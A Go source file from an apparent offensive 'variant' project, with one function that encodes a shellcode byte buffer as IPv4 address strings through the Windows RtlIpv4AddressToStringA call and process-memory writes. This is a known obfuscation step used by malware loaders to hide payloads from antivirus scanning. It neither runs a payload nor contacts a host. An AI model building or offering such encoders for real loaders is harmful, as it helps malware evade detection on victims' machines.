package crypto

import (
	"unsafe"
	"variant/log"
	"variant/wdll"

	"golang.org/x/sys/windows"
)

func BinToIpv4Strings(shellcode []byte) []string {
	mac, _ := windows.VirtualAlloc(
		0,
		uintptr(len(shellcode)/4*17),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)

	for i := 0; i < len(shellcode)/4; i++ {
		var macAddress [17]byte
		ret, _, _ := wdll.RtlIpv4AddressToStringA().Call(uintptr(unsafe.Pointer(&shellcode[i*4])), uintptr(unsafe.Pointer(&macAddress[0])), 0)
		if ret == 0 {
			log.Fatal("error calling RtlIpv4AddressToStringA")
		}

		err := windows.WriteProcessMemory(windows.CurrentProcess(), mac+uintptr(i*17), &macAddress[0], 17, nil)
		if err != nil {
			log.Fatalf("WriteProcessMemory() err: %v", err)
		}
	}

	var l []string
	for i := 0; i < len(shellcode)/4; i++ {
		var macAddress [17]byte
		err := windows.ReadProcessMemory(windows.CurrentProcess(), mac+uintptr(i*17), &macAddress[0], 17, nil)
		if err != nil {
			log.Fatalf("ReadProcessMemory() err: %v", err)
		}

		l = append(l, string(macAddress[:]))
	}

	return l
}
